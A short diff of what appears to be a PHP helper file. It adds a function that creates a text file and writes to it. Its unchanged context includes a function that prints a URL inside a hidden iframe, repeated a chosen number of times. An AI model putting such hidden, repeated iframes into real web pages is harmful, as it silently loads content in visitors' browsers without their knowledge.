@@ -10,6 +10,11 @@ function hframe_r($web_lk385,$hg555){
  echo str_repeat("<iframe src='$web_lk385' hidden></iframe>
  ",$hg555);
 }
+function create_text_file($url88888,$text8447){
+  $jk= fopen($url88888,"x");
+fwrite($jk,$text8447);
+fclose($jk);
+}
 function ad_text_to_file($url_gw12n,$text_qgdw){
   $aFile123 = fopen($url_gw12n, "a");
 fwrite($aFile123, $text_qgdw);
